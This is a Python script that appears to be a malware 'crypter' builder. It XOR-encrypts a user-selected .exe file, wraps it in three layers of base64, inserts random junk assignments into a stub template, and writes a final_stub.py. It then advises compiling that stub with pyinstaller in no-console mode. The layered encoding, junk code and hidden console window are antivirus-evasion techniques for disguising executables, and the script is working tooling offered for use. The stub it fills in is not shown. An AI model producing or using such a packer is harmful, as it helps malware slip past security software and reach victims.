import base64
import random
import string
import tkinter as tk
from tkinter import filedialog
import os

def generate_key(length=16):
    return os.urandom(length)

def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def multi_layer_base64(data, layers=3):
    for _ in range(layers):
        data = base64.b64encode(data)
    return data

def insert_random_junk():
    return f"{''.join(random.choices(string.ascii_letters, k=8))} = '{''.join(random.choices(string.ascii_letters + string.digits, k=12))}'"

root = tk.Tk()
root.withdraw()
file_path = filedialog.askopenfilename(title="Select the .exe file you want to encrypt")

if not file_path:
    print("File isn't selected.")
    exit()

with open(file_path, "rb") as f:
    original_data = f.read()

key = generate_key()

encrypted_data = xor_encrypt(original_data, key)
encoded_data = multi_layer_base64(encrypted_data, layers=3)

encoded_payload = encoded_data.decode()
encoded_key = base64.b64encode(key).decode()


with open("stub.py", "r", encoding="utf-8") as f:
    stub_code = f.read()

stub_code = stub_code.replace("#<JUNK>", insert_random_junk())
stub_code = stub_code.replace("#<BASE64>", encoded_payload)
stub_code = stub_code.replace("#<KEY>", f"{encoded_key}")

with open("final_stub.py", "w", encoding="utf-8") as f:
    f.write(stub_code)

with open("payload.key", "wb") as keyfile:
    keyfile.write(key)

print("\n final_stub.py created!")
print("The key imported like 'payload.key'")
print("Now you can make it an .exe with the command 'pyinstaller --onefile --noconsole final_stub.py'")
